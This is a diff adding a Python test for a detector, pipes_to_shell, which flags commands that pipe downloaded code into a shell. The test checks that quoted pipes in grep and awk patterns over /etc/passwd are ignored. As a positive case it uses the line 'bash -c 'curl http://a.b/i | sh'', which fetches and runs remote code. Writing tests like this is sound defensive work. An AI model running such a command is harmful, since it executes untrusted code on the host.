@@ -100,3 +100,10 @@ def test_tool_names_only_programs_run_or_downloaded():
 ])
 def test_tool_names_skip_generic_names(line):
     assert tool_names(line) == []
+
+
+def test_a_pipe_inside_quotes_is_not_a_shell_pipe():
+    assert not pipes_to_shell("grep -E 'bash|sh$' /etc/passwd")
+    assert not pipes_to_shell('awk -F: "/sh$|bash/" /etc/passwd')
+    # a shell -c script still counts
+    assert pipes_to_shell("bash -c 'curl http://a.b/i | sh'")
